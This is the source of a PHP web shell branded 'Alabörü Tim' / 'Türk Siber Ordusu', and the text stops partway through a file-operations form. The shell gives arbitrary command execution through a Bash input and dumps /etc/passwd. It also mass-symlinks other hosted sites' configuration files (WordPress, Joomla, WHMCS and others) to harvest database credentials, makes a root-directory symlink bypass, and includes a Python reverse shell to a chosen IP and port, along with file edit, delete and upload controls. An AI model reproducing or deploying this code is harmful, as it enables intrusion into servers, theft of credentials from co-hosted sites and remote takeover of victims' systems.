<title>Alabörü Tim</title>
<meta charset='utf-8'>
<script type='text/javascript'>
function hepsinisec() {
        var sec = document.getElementsByName('islemler[]');
        for (var i = 0; i < sec.length; i++) {
            if (sec[i].type == 'checkbox')
            sec[i].checked = true;
        }
    }

function hepsinisecme() {
        var sec = document.getElementsByName('islemler[]');
        for (var i = 0; i < sec.length; i++) {
            if (sec[i].type == 'checkbox')
                sec[i].checked = false;
        }
    }
</script>
<style>
body{
    color:white;
    background-color:black;    
}
.diger{
    border-left: 6px solid #323232;
    border-width:%100;
    color:green;
    background-color: #141414;
    font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
    font-size:14px;
}
.dizin{
  border-bottom: 6px solid #323232;
  border-width:%100;
  color:red;
  background-color: #141414;
  font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
  font-size:20px;
}
.icerik{
    background-color:#0c0c0c;
    color:white;
    border-bottom: 6px solid #323232;
    border-left: 6px solid #323232;
    border-right: 6px solid #323232;
    font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
    font-size:16px;
}
.yaz1{
    color:red;
    font-size:12px;
}
.alaboru{
    font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
    color:white;
    font-size:48px;
    text-shadow:10px 3px 10px gray;
    
}
.dizin1{
    border-style:solid 10px;
    border-width:%100;
    color:#8b8b8b;
    border-color:#3f3f3f;
    background-color: #191919;
    font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
    font-size:20px;
    width:90%;
}
.ilerigeri{
    border-style:none;
    border-width:%100;
    color:white;
    background-color: #141414;
    font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
    font-size:20px;
}

.slogan{
    color:white;
    font-family: 'dosis','Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
}
.dizinlink{
    color:red;
    text-decoration: none;
    font-family: 'dosis','Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;   
}
.dizinlink:hover{
    border:solid;
    border-color:red;
    box-shadow:#111 1px 5px 12px;
}
.dosyalink{
    color:gray;
    text-decoration: none;
    font-family: 'dosis','Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
}
.dosyalink:hover{
    border:solid;
    border-color:#777;
    box-shadow:#111 1px 5px 12px;
}
.bilgisunucu{
    color:white;
    font-family: 'dosis','Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
    font-size:12px;
}
.bilgisunucudiv{
  border-bottom: 6px solid #003333;
  border-width:%100;
  color:red;
  background-color: #141414;
  font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
  font-size:20px;
}
.islemler_diger{
  border-bottom: 6px solid #262626;
  border-width:%100;
  background-color: #141414;
  font-family: "Comic Sans MS", cursive, sans-serif;
  font-size:18px;
}
.islemler_dugme{
    border:none;
    border-color:white;
    color:white;
    background-color:#555;
    font-size:12px;
    font-family: "Comic Sans MS", cursive, sans-serif;
}
.islemler_dugme:hover{
    webkit-box-shadow: -2px 0px 19px 10px rgba(0,0,0,1);
    -moz-box-shadow: -2px 0px 19px 10px rgba(0,0,0,1);
    box-shadow: -2px 0px 19px 10px rgba(0,0,0,1);
}
.islem_kutu{
    background-color:#333;
    border:none;
    color:white;
}
.islem_kutu:hover{
    webkit-box-shadow: -2px 0px 19px 10px rgba(0,0,0,1);
    -moz-box-shadow: -2px 0px 19px 10px rgba(0,0,0,1);
    box-shadow: -2px 0px 19px 10px rgba(0,0,0,1);
}
.düzenle{
  border-bottom: 6px solid #222;
  border-width:%100;
  color:red;
  background-color: #141414;
  font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
  font-size:20px;
}
.link_islem{
    color:white;
    font-size:14px;
    font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
    text-decoration: none;
}
}
</style>

<center><div class='alaboru'>ALABÖRÜ TİM</center>
<span class='slagon'><center>Ayyıldız'ın koruyucuları | Türk Siber Ordusu</center></span><br>
<div class="bilgisunucudiv">
<?php
$sistem = PHP_OS;
$uid = getmyuid();
$guid = getmygid();
$pid = getmypid();
$inode = getmyinode();
$sfm = @ini_get('safe_mode');
$devere_disif = @ini_get('disable_functions');
echo "<span class='bilgisunucu'>Sistem:".$sistem."</span>";
echo " <span class='bilgisunucu'>Server Admin:".$_SERVER['SERVER_ADMIN']."</span>";
echo " <span class='bilgisunucu'>Sunucu:".$_SERVER['SERVER_ADDR']."</span>";
echo " <span class='bilgisunucu'>Yazılım:".$_SERVER['SERVER_SOFTWARE']."</span>";
echo " <span class='bilgisunucu'>Ağ Geçidi:".$_SERVER['GATEWAY_INTERFACE']."</span>";
echo " <span class='bilgisunucu'>Ana Dizin:".$_SERVER['DOCUMENT_ROOT'] . "[".substr(sprintf('%o', fileperms($_SERVER['DOCUMENT_ROOT'])), -4)."]</span>";
echo " <span class='bilgisunucu'>Uid:".$uid."</span>";
echo " <span class='bilgisunucu'>Guid:".$guid."</span>";
echo " <span class='bilgisunucu'>Pid:".$pid."</span>";
echo " <span class='bilgisunucu'>İnode:".$inode."</span>";
echo "<br>";
echo "<span class='bilgisunucu'>işlevleri devre dışı bırakılanlar:<br><textarea readonly style='resize: none; margin: 0px; width: 1331px;font-size:10px; height: 40px;' class='islem_kutu'>$devere_disif</textarea></span>";
echo "<br>";
echo "<span class='bilgisunucu'>Safe Mode:$sfm</span>";

?>

<?php
if($_GET['düzenle']){
$dosya = htmlspecialchars($_GET['düzenle']);
echo "<br>".$dosya;
echo "</div><div class='düzenle'>";
if(!is_file(htmlspecialchars($_GET['düzenle']))){
    echo "<br><font color='white'>Böyle bir dosya yok</font>";
    exit;
}
echo "<form method='post'>";
if(is_writable($dosya)){
    echo "<input type='submit' name='kayıtet' value='Değişikliği Kayıt Et' class='islemler_dugme'></input>";
    echo "  <input type='submit' name='gerial' value='Değişikliği Geri Al' class='islemler_dugme'></input>";
    $önceki_veri = htmlentities(file_get_contents($dosya));
}
echo "  <input type='submit' name='dosyayıindir' value='Dosyayı İndir' class='islemler_dugme'></input>";
echo "  <input type='submit' name='yeniisim' value='Dosyayı Yeniden Adlandır' class='islemler_dugme'></input>";
echo "  <input type='submit' name='sil' value='Dosyayı Sil' class='islemler_dugme'></input>";
if($_POST['gerial']){
    $oku = $önceki_veri;
}else{
    $oku = htmlentities(file_get_contents($dosya));
}
if(is_readable($dosya)){
    echo "<br><textarea name='veri' class='islem_kutu' style='margin: 0px; width: 1348px;font-size:10px; height: 320px;'>".$oku."</textarea >";
}else{
    echo "<br><font>Dosyayı okumak için yeterli yetki yok</font>";
}
echo "</form></div>";
if($_POST['dosyayıindir']){
    $indir = $dosya;
    header("Content-Disposition: attachment; filename=''". basename($indir));
    header("Content-Length: " . filesize($indir));
    header("Content-Type: application/octet-stream;");
    readfile(htmlentities($indir));
}
if($_POST['yeniisim']){
    echo "<form method='post'>";
    echo "<input class='islem_kutu' type='text' name='yadlandır'></input>";
    echo "<input class='islemler_dugme' type='submit' name='adlandır' value='Yeniden Adlandır'></input>";
    echo "</form>";
}
if($_POST['adlandır']){
    $eskiisim = htmlspecialchars($_GET['düzenle']);
    $isim = htmlspecialchars($_POST['yadlandır']);
    if(rename($eskiisim,$isim)){
        echo "<META http-equiv='Refresh' content='0;'>";
    }
    else{
        cmd("mv $eskiisim $isim");
        echo "<META http-equiv='Refresh' content='0;'>";
    }
}
if($_POST['kayıtet']){
    $veri = $_POST['veri'];
    file_put_contents($dosya,$veri);
    echo "<META http-equiv='Refresh' content='0;'>";

}
if($_POST['sil']){
    if(unlink($dosya)){
        echo "<META http-equiv='Refresh' content='0;'>";
    }else{
        if($sistem == "Linux"){
            if(cmd("rm $dosya")){
                echo "<META http-equiv='Refresh' content='0;'>";
            }
        }else{
            if(cmd("del /f $dosya")){
                echo "<META http-equiv='Refresh' content='0;'>";
            }else{
                echo "Dosya silinemedi";
            }
        }
    }
}
exit;
}
?>
</div>
<br>
<div class='islemler_diger'>
<a class='link_islem' href='?diger=komutsatri' target='__komutsatri'>Komut Satrı</a> -
<a class='link_islem' href='?diger=ellesym' target='__manuelsym'>Elle Symlink</a> -
<a class='link_islem' href='?diger=börüsym' target='__börüsym'>Börü Symlink</a> -
<a class='link_islem' href='?diger=passwd' target='__passwd'>etc/passwd Bypass</a> -
<a class='link_islem' href='?diger=bypasskok' target='__bypasskok'>Kök Bypass</a> -
<a class='link_islem' href='?diger=pyters' target='__pyters'>Python Ters Bağlantı</a>
</div><br>
<div class="dizin">
</font>
<center>
<?php
function cmd($komut){
    $komut = htmlspecialchars($komut);
    if(htmlentities(system($komut)));
    else{
        if(shell_exec($komut)){
            $c = shell_exec($komut);
            echo "<pre>";
            echo htmlentities($c);
            echo "</pre>";
        }else{
            if(exec($komut)){
            $c = exec($komut);
            echo "<pre>";
            echo htmlentities($c);
            echo "</pre>";
        }else{
            echo "Komut çalıştırılamadı";
        }
    }     
    }
}
if($_GET['diger']){
    $diger = $_GET['diger'];
    if($diger == "komutsatri"){
        echo "<pre class='yaz1'><form method='post'>";
        echo "<div class='diger'>";
        echo "Bash:<input type='text' class='islem_kutu' name='komut' size='100'></input><input type='submit' name='calistir' value='Komutu Çalıştır' class='islemler_dugme'></input>";
        echo "</form>";
        if($_POST['komut'] || $_POST['calistir']){
            echo "<br><pre>";
            cmd($_POST['komut']);
        }
        echo "</pre>";
        exit;
    }
    if($diger == "ellesym"){
        echo "<form method='post'>";
        echo "<font size='2' color='green'>Symlink çekilcek dosya:</font><input type='text' size='150' name='symdosya' class='islem_kutu'></input><br>";
        echo "<font size='2' color='green'>Oluşturulucak sembolik bağ dosya adı:</font>"; 
        echo "<input type='text' size='150' name='olsutrds' value='symlink.txt' class='islem_kutu'></input><br>";  
        echo "<input type='submit' class='islemler_dugme' name='symcek' value='Symlink Çek'></input>";
        echo "</form>";
        if($_POST['symcek']){
            echo "<pre>";
            $sym = $_POST['symdosya'];
            $olstur = $_POST['olsutrds'];
            echo "sym_alaboru_com Klasörü oluşturuluyor<br>";
            mkdir("sym_alaboru_com");
            echo "Klasör oluşturuldu<br>";
            echo "Dizin değiştiriliyor<br>";
            if(chdir("sym_alaboru_com")){
                    echo "Dizin değiştirildi<br>";
                    echo "Symlink çekiliyor<br>";
                    if(symlink($sym,$olstur)){
                        echo "Oluşturuldu<br>";
                    }else{
                        $symyolla = "-ln -s $sym $olstur";
                        if(!cmd($symyolla) == "Komut çalıştırılamadı"){
                            echo "Oluşturuldu<br>";
                        }else{
                            echo "Oluşturulamadı<br>";
                        }
                    }
                }else{
                    echo "Dizin değiştirilemedi!<br>";
                }
            }else{
                echo "Oluşturulamadı!<br>İşlem iptal<br>";
            }
            echo "</pre>";
        }
    if($diger == "passwd"){
        echo "<pre class='yaz1'>";
        echo "<textarea style='margin: 0px; width: 560px; height: 349px;' class='islem_kutu'>";
        for($uid=0;$uid<2000;$uid++){
            $nothing = posix_getpwuid($uid);
            if (!empty($nothing)) {
            while (list ($key, $val) = each($nothing)){
                echo $val;
            }
            echo "\n";
        }
    }
    echo "</textarea>";
        echo "</pre>";    
    }    
    if($diger == "börüsym"){
        echo "<form method='post'>";
        echo "etc/passwd<br><textarea name='passwd' class='islem_kutu' style='text-shadow: 1px 1px black; margin: 0px; height: 279px; width: 486px;'></textarea>";
        echo "<br>Dizin<br>";
        echo "<input type='text' size='75' name='dizn' value='".getcwd()."' class='islem_kutu'></input><br>";
        echo "<br>Ara Dizin</br>";
        echo "<input type='text' size='75' name='dizn1' value='/' class='islem_kutu'></input><br>";
        echo "<input type='submit' value='Kontrol' name='börü' class='islemler_dugme'></input>";
        echo "</form>";
    }
    if($_POST['börü']){
        mkdir("sym__alaboru");
        chdir("sym__alaboru");
        $dizin = htmlspecialchars($_POST['dizn']);
        $dizin1 = htmlspecialchars($_POST['dizn1']);
        foreach($_POST['passwd'] as $pwd){
            $pawd=explode(":",$pwd);
            $sitess = $pawd[0];
            symlink($dizin.$sitess.$dizin1.'includes/configure.php',$sitess.'-shop.txt');
            symlink($dizin.$sitess.$dizin1.'os/includes/configure.php',$sitess.'-shop-os.txt');
            symlink($dizin.$sitess.$dizin1.'oscom/includes/configure.php',$sitess.'-oscom.txt');
            symlink($dizin.$sitess.$dizin1.'oscommerce/includes/configure.php',$sitess.'-oscommerce.txt');
            symlink($dizin.$sitess.$dizin1.'oscommerces/includes/configure.php',$sitess.'-oscommerces.txt');
            symlink($dizin.$sitess.$dizin1.'shop/includes/configure.php',$sitess.'-shop2.txt');
            symlink($dizin.$sitess.$dizin1.'shopping/includes/configure.php',$sitess.'-shop-shopping.txt');
            symlink($dizin.$sitess.$dizin1.'sale/includes/configure.php',$sitess.'-sale.txt');
            symlink($dizin.$sitess.$dizin1.'amember/config.inc.php',$sitess.'-amember.txt');
            symlink($dizin.$sitess.$dizin1.'config.inc.php',$sitess.'-amember2.txt');
            symlink($dizin.$sitess.$dizin1.'members/configuration.php',$sitess.'-members.txt');
            symlink($dizin.$sitess.$dizin1.'config.php',$sitess.'-4images1.txt');
            symlink($dizin.$sitess.$dizin1.'forum/includes/config.php',$sitess.'-forum.txt');
            symlink($dizin.$sitess.$dizin1.'forums/includes/config.php',$sitess.'-forums.txt');
            symlink($dizin.$sitess.$dizin1.'admin/conf.php',$sitess.'-5.txt');
            symlink($dizin.$sitess.$dizin1.'admin/config.php',$sitess.'-4.txt');
            symlink($dizin.$sitess.$dizin1.'wp-config.php',$sitess.'-wp13.txt');
            symlink($dizin.$sitess.$dizin1.'wp/wp-config.php',$sitess.'-wp13-wp.txt');
            symlink($dizin.$sitess.$dizin1.'WP/wp-config.php',$sitess.'-wp13-WP.txt');
            symlink($dizin.$sitess.$dizin1.'wp/beta/wp-config.php',$sitess.'-wp13-wp-beta.txt');
            symlink($dizin.$sitess.$dizin1.'beta/wp-config.php',$sitess.'-wp13-beta.txt');
            symlink($dizin.$sitess.$dizin1.'press/wp-config.php',$sitess.'-wp13-press.txt');
            symlink($dizin.$sitess.$dizin1.'wordpress/wp-config.php',$sitess.'-wp13-wordpress.txt');
            symlink($dizin.$sitess.$dizin1.'Wordpress/wp-config.php',$sitess.'-wp13-Wordpress.txt');
            symlink($dizin.$sitess.$dizin1.'blog/wp-config.php',$sitess.'-wp13-Wordpress.txt');
            symlink($dizin.$sitess.$dizin1.'wordpress/beta/wp-config.php',$sitess.'-wp13-wordpress-beta.txt');
            symlink($dizin.$sitess.$dizin1.'news/wp-config.php',$sitess.'-wp13-news.txt');
            symlink($dizin.$sitess.$dizin1.'new/wp-config.php',$sitess.'-wp13-new.txt');
            symlink($dizin.$sitess.$dizin1.'blog/wp-config.php',$sitess.'-wp-blog.txt');
            symlink($dizin.$sitess.$dizin1.'beta/wp-config.php',$sitess.'-wp-beta.txt');
            symlink($dizin.$sitess.$dizin1.'blogs/wp-config.php',$sitess.'-wp-blogs.txt');
            symlink($dizin.$sitess.$dizin1.'home/wp-config.php',$sitess.'-wp-home.txt');
            symlink($dizin.$sitess.$dizin1.'protal/wp-config.php',$sitess.'-wp-protal.txt');
            symlink($dizin.$sitess.$dizin1.'site/wp-config.php',$sitess.'-wp-site.txt');
            symlink($dizin.$sitess.$dizin1.'main/wp-config.php',$sitess.'-wp-main.txt');
            symlink($dizin.$sitess.$dizin1.'test/wp-config.php',$sitess.'-wp-test.txt');
            symlink($dizin.$sitess.$dizin1.'arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
            symlink($dizin.$sitess.$dizin1.'arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
            symlink($dizin.$sitess.$dizin1.'joomla/configuration.php',$sitess.'-joomla2.txt');
            symlink($dizin.$sitess.$dizin1.'protal/configuration.php',$sitess.'-joomla-protal.txt');
            symlink($dizin.$sitess.$dizin1.'joo/configuration.php',$sitess.'-joo.txt');
            symlink($dizin.$sitess.$dizin1.'cms/configuration.php',$sitess.'-joomla-cms.txt');
            symlink($dizin.$sitess.$dizin1.'site/configuration.php',$sitess.'-joomla-site.txt');
            symlink($dizin.$sitess.$dizin1.'main/configuration.php',$sitess.'-joomla-main.txt');
            symlink($dizin.$sitess.$dizin1.'news/configuration.php',$sitess.'-joomla-news.txt');
            symlink($dizin.$sitess.$dizin1.'new/configuration.php',$sitess.'-joomla-new.txt');
            symlink($dizin.$sitess.$dizin1.'home/configuration.php',$sitess.'-joomla-home.txt');
            symlink($dizin.$sitess.$dizin1.'vb/includes/config.php',$sitess.'-vb~config.txt');
            symlink($dizin.$sitess.$dizin1.'vb3/includes/config.php',$sitess.'-vb3~config.txt');
            symlink($dizin.$sitess.$dizin1.'cc/includes/config.php',$sitess.'-vb1~config.txt');
            symlink($dizin.$sitess.$dizin1.'includes/config.php',$sitess.'-includes-vb.txt');
            symlink($dizin.$sitess.$dizin1.'forum/includes/class_core.php',$sitess.'-vbluttin~class_core.php.txt');
            symlink($dizin.$sitess.$dizin1.'vb/includes/class_core.php',$sitess.'-vbluttin~class_core.php1.txt');
            symlink($dizin.$sitess.$dizin1.'cc/includes/class_core.php',$sitess.'-vbluttin~class_core.php2.txt');
            symlink($dizin.$sitess.$dizin1.'whm/configuration.php',$sitess.'-whm15.txt');
            symlink($dizin.$sitess.$dizin1.'central/configuration.php',$sitess.'-whm-central.txt');
            symlink($dizin.$sitess.$dizin1.'whm/whmcs/configuration.php',$sitess.'-whm-whmcs.txt');
            symlink($dizin.$sitess.$dizin1.'whm/WHMCS/configuration.php',$sitess.'-whm-WHMCS.txt');
            symlink($dizin.$sitess.$dizin1.'whmc/WHM/configuration.php',$sitess.'-whmc-WHM.txt');
            symlink($dizin.$sitess.$dizin1.'whmcs/configuration.php',$sitess.'-whmcs.txt');
            symlink($dizin.$sitess.$dizin1.'support/configuration.php',$sitess.'-support.txt');
            symlink($dizin.$sitess.$dizin1.'supp/configuration.php',$sitess.'-supp.txt');
            symlink($dizin.$sitess.$dizin1.'secure/configuration.php',$sitess.'-sucure.txt');
            symlink($dizin.$sitess.$dizin1.'secure/whm/configuration.php',$sitess.'-sucure-whm.txt');
            symlink($dizin.$sitess.$dizin1.'secure/whmcs/configuration.php',$sitess.'-sucure-whmcs.txt');
            symlink($dizin.$sitess.$dizin1.'cpanel/configuration.php',$sitess.'-cpanel.txt');
            symlink($dizin.$sitess.$dizin1.'panel/configuration.php',$sitess.'-panel.txt');
            symlink($dizin.$sitess.$dizin1.'host/configuration.php',$sitess.'-host.txt');
            symlink($dizin.$sitess.$dizin1.'hosting/configuration.php',$sitess.'-hosting.txt');
            symlink($dizin.$sitess.$dizin1.'hosts/configuration.php',$sitess.'-hosts.txt');
            symlink($dizin.$sitess.$dizin1.'configuration.php',$sitess.'-joomla.txt');
            symlink($dizin.$sitess.$dizin1.'submitticket.php',$sitess.'-whmcs2.txt');
            symlink($dizin.$sitess.$dizin1.'clients/configuration.php',$sitess.'-clients.txt');
            symlink($dizin.$sitess.$dizin1.'client/configuration.php',$sitess.'-client.txt');
            symlink($dizin.$sitess.$dizin1.'clientes/configuration.php',$sitess.'-clientes.txt');
            symlink($dizin.$sitess.$dizin1.'cliente/configuration.php',$sitess.'-client.txt');
            symlink($dizin.$sitess.$dizin1.'clientsupport/configuration.php',$sitess.'-clientsupport.txt');
            symlink($dizin.$sitess.$dizin1.'billing/configuration.php',$sitess.'-billing.txt'); 
            symlink($dizin.$sitess.$dizin1.'manage/configuration.php',$sitess.'-whm-manage.txt'); 
            symlink($dizin.$sitess.$dizin1.'my/configuration.php',$sitess.'-whm-my.txt'); 
            symlink($dizin.$sitess.$dizin1.'myshop/configuration.php',$sitess.'-whm-myshop.txt'); 
            symlink($dizin.$sitess.$dizin1.'includes/dist-configure.php',$sitess.'-zencart.txt'); 
            symlink($dizin.$sitess.$dizin1.'zencart/includes/dist-configure.php',$sitess.'-shop-zencart.txt'); 
            symlink($dizin.$sitess.$dizin1.'shop/includes/dist-configure.php',$sitess.'-shop-ZCshop.txt'); 
            symlink($dizin.$sitess.$dizin1.'Settings.php',$sitess.'-smf.txt'); 
            symlink($dizin.$sitess.$dizin1.'smf/Settings.php',$sitess.'-smf2.txt'); 
            symlink($dizin.$sitess.$dizin1.'forum/Settings.php',$sitess.'-smf-forum.txt'); 
            symlink($dizin.$sitess.$dizin1.'forums/Settings.php',$sitess.'-smf-forums.txt'); 
            symlink($dizin.$sitess.$dizin1.'upload/includes/config.php',$sitess.'-up.txt');
            symlink($dizin.$sitess.$dizin1.'article/config.php',$sitess.'-Nwahy.txt'); 
            symlink($dizin.$sitess.$dizin1.'up/includes/config.php',$sitess.'-up2.txt');
            symlink($dizin.$sitess.$dizin1.'conf_global.php',$sitess.'-6.txt');
            symlink($dizin.$sitess.$dizin1.'include/db.php',$sitess.'-7.txt');
            symlink($dizin.$sitess.$dizin1.'connect.php',$sitess.'-PHP-Fusion.txt');
            symlink($dizin.$sitess.$dizin1.'mk_conf.php',$sitess.'-9.txt');
            symlink($dizin.$sitess.$dizin1.'includes/config.php',$sitess.'-traidnt1.txt');
            symlink($dizin.$sitess.$dizin1.'config.php',$sitess.'-4images.txt');
            symlink($dizin.$sitess.$dizin1.'sites/default/settings.php',$sitess.'-Drupal.txt');
            symlink($dizin.$sitess.$dizin1.'member/configuration.php',$sitess.'-1member.txt') ; 
            symlink($dizin.$sitess.$dizin1.'billings/configuration.php',$sitess.'-billings.txt') ; 
            symlink($dizin.$sitess.$dizin1.'whm/configuration.php',$sitess.'-whm.txt');
            symlink($dizin.$sitess.$dizin1.'supports/configuration.php',$sitess.'-supports.txt');
            symlink($dizin.$sitess.$dizin1.'requires/config.php',$sitess.'-AM4SS-hosting.txt');
            symlink($dizin.$sitess.$dizin1.'supports/includes/iso4217.php',$sitess.'-hostbills-supports.txt');
            symlink($dizin.$sitess.$dizin1.'client/includes/iso4217.php',$sitess.'-hostbills-client.txt');
            symlink($dizin.$sitess.$dizin1.'support/includes/iso4217.php',$sitess.'-hostbills-support.txt');
            symlink($dizin.$sitess.$dizin1.'billing/includes/iso4217.php',$sitess.'-hostbills-billing.txt');
            symlink($dizin.$sitess.$dizin1.'billings/includes/iso4217.php',$sitess.'-hostbills-billings.txt');
            symlink($dizin.$sitess.$dizin1.'host/includes/iso4217.php',$sitess.'-hostbills-host.txt');
            symlink($dizin.$sitess.$dizin1.'hosts/includes/iso4217.php',$sitess.'-hostbills-hosts.txt');
            symlink($dizin.$sitess.$dizin1.'hosting/includes/iso4217.php',$sitess.'-hostbills-hosting.txt');
            symlink($dizin.$sitess.$dizin1.'hostings/includes/iso4217.php',$sitess.'-hostbills-hostings.txt');
            symlink($dizin.$sitess.$dizin1.'includes/iso4217.php',$sitess.'-hostbills.txt');
            symlink($dizin.$sitess.$dizin1.'hostbills/includes/iso4217.php',$sitess.'-hostbills-hostbills.txt');
            symlink($dizin.$sitess.$dizin1.'hostbill/includes/iso4217.php',$sitess.'-hostbills-hostbill.txt');   
        }
        echo "Kontrol alındı";
    }
    if($diger == "bypasskok"){
        mkdir('kök');
        chdir('kök');
        if(symlink('/','kök')){
            file_get_contents('.htaccess','Options Indexes FollowSymLinks
            DirectoryIndex ssssss.htm
            AddType txt .php
            AddHandler txt .php');
            echo "Kök oluşturuldu";
        }else{
            if(!cmd('ln -s / kök') == "Komut çalıştırılamadı"){
                file_get_contents('.htaccess','Options Indexes FollowSymLinks
                DirectoryIndex ssssss.htm
                AddType txt .php
                AddHandler txt .php');
                echo "<br>Kök oluşturuldu";
            }else{
                echo "Kök oluşturulamadı<br>";
        }
    }
}
if($diger == "pyters"){
    echo "<form method='post'>";
    echo "ip:<input type='text' name='ip' class='islem_kutu'></input>:<input type='text' name='port' class='islem_kutu'></input>";
    echo "<input type='submit' name='calistir' class='islemler_dugme' value='Çalıştır'></input>";
    echo "</form>";
    if($_POST['calistir']){
        $ip = htmlspecialchars($_POST['ip']);
        $port = $_POST['port'];
        system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip',int($port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);");
    }
}
exit;
}
?>
<?php
if($_GET['dizin'] || $_GET['ileri']){
    $dizin = $_GET['dizin'];
}else{
    $dizin = getcwd();
}
?>
<br>
<form method="get">
<center><?php if($sistem == "Linux"){echo "<font color='gray' size='2'> Karnel:";}echo cmd("uname -a")."</font>"; ?></center>
<input name="dizin" class="dizin1" value=<?php echo $dizin; ?>></input>
<input name="ileri" class="ilerigeri" type="submit" value="Değiş"></input>
</form>
<?php
if(is_executable($dizin)){
    echo "<font color='white' size='2'>Dizinde komut yürütelebilir</font>";
}else{
    echo "<font color='red' size='2'>Dizinde komut yürütülemez</font>";
}; ?>

</center>
</div>
<div class="icerik">
<span class="liste1">
<?php
$dizinler = scandir($dizin);
if($dizinler == 0){
    echo "<center>Erişim redi veya böyle klasör yok</center>";
}
echo "
<button class='islemler_dugme' onclick='hepsinisec()'>Hepsini Seç</button>
<button class='islemler_dugme' onclick='hepsinisecme()'>Hiç birini seçme</button>
<br>
<form method='post'>
";
function boyut($bytes)
{
    if ($bytes >= 1073741824)
    {
        $bytes = number_format($bytes / 1073741824, 2) . ' GB';
    }
    elseif ($bytes >= 1048576)
    {
        $bytes = number_format($bytes / 1048576, 2) . ' MB';
    }
    elseif ($bytes >= 1024)
    {
        $bytes = number_format($bytes / 1024, 2) . ' KB';
    }
    elseif ($bytes > 1)
    {
        $bytes = $bytes . ' byte';
    }
    elseif ($bytes == 1)
    {
        $bytes = $bytes . ' byte';
    }
    else
    {
        $bytes = '0 byte';
    }

    return $bytes;
}
foreach($dizinler as $dile){
    if($dile != "." && $dile !=".."){
    if(filetype($dizin."/".$dile) == "dir"){
        $yeni_dizin = "$dizin/$dile";
        $izin = fileperms($dizin . "/" . $dile);
        $izin = substr(sprintf('%o', $izin), -4);
        echo "<input type='checkbox' name='islemler[]' value='$dizin/$dile'><a  class='dizinlink' href='?dizin=$yeni_dizin'>".$dile."</a><font color='green' size='2'> Sahip/Grub " . fileowner($dizin."/".$dile)."/".filegroup($dizin."/".$dile) . "</font>". "<font size='2' color='gray'> İzin ".$izin."</font>";
        echo "<input type='hidden' value='$dizin' name='sadece_dizin[]'></input>";
        echo "<input type='hidden' value='$dile' name='sadece_isim[]'></input>";
        echo "</input><br>";
    }
    if(filetype($dizin."/".$dile) == "file"){
        $izin = fileperms($dizin . "/" . $dile);
        $izin = substr(sprintf('%o', $izin), -4);
        $okunabilir = is_readable($dizin . "/" . $dile);
        $yazilir = is_writable($dizin . "/" . $dile);
        $boyut = boyut(filesize($dizin."/".$dile));

        if($okunabilir){
            $yaz = "<font size='2' color='white'>Okunabilir</font>";
        }else{
            $yaz = "<font size='2' color='red'>Okunamaz</font>";
        }
        if($yazilir){
            $yaz1 = " <font size='2' color='white'>Yazılabilir</font>";
        }else{
            $yaz1 =  " <font size='2' color='red'>Yazılamaz</font>";
        }
        echo "<input type='checkbox' name='islemler[]' value='$dizin/$dile'><a class='dosyalink' target='düzenle' href='?düzenle=$dizin/$dile'>$dile</a><font color='green' size='2'> Sahip/Grub " . fileowner($dizin."/".$dile)."/".filegroup($dizin."/".$dile) ." <font color='cyan'>Tür ".mime_content_type($dizin."/".$dile)." <font color='gray'>İzin ".$izin."</font></font></font> ".$yaz.$yaz1." <font color='#009999' size='2'>$boyut</font>";
        echo "<input type='hidden' value='$dizin' name='sadece_dizin'></input>";
        echo "<input type='hidden' value='$dile' name='sadece_isim'></input>";
        echo "</input><br>";
    }
}
}
echo "
<select name='islem' class='islemler_dugme'>
<option value='---'>---</option>
<option value='kopyala'>Kopyala</option>
<option value='indir'>İndir</option>
<option value='sil'>Sil</option>
</select><input type='submit' name='islemgönder' class='islemler_dugme' value='>'></input>
</form>
";
?>
</span>
</div>
</div>
<?php
function deleteDirectory($dirPath) {
    if (is_dir($dirPath)) {
        $objects = scandir($dirPath);
        foreach ($objects as $object) {
            if ($object != "." && $object !="..") {
                if (filetype($dirPath . DIRECTORY_SEPARATOR . $object) == "dir") {
                    deleteDirectory($dirPath . DIRECTORY_SEPARATOR . $object);
                } else {
                    unlink($dirPath . DIRECTORY_SEPARATOR . $object);
                }
            }
        }
    reset($objects);
    rmdir($dirPath);
    }
}
?>
<?php

echo "<form method='post'>Klasör Oluştur:<input class='islem_kutu' type='text' name='dizinyap'></input>
Dosya Oluştur:<input class='islem_kutu' type='text' name='dosyayap'></input>
<input class='islemler_dugme' type='submit' name='islemyap2' value='>'></input></form>";
if($_POST['islemyap2']){
    if(!empty($_POST['dizinyap']) || $_POST['dizinyap']){
        mkdir($_POST['dizinyap'],0777);
        echo "<META http-equiv='Refresh' content='0;'>";
    }
    if(!empty($_POST['dosyayap']) || $_POST['dosyayap']){
        fopen($_POST['dosyayap'],"w");
        fclose($_POST['dosyayap']);
        chmod($_POST['dosyayap'],0777);
        echo "<META http-equiv='Refresh' content='0;'>";
    }
}
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input class="islem_kutu" type="file" name="file" size="50"><input class="islem_kutu" name="_upl" type="submit" id="_upl" value="Yükle"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yüklendi<b><br><br>'; }
else { echo '<b>Yüklenemedi </b><br><br>'; }
}
?>

<?php

if($_POST['islemgönder']){
    $islem = $_POST['islem'];
    if($islem == "kopyala"){
        echo "<form method='post'>";
        $islemler = $_POST['islemler'];
        foreach($islemler as $islemyap){
            echo "<pre>";
            echo "$islemyap:<input name='kopyala[]' type='text' class='islem_kutu'></input>";
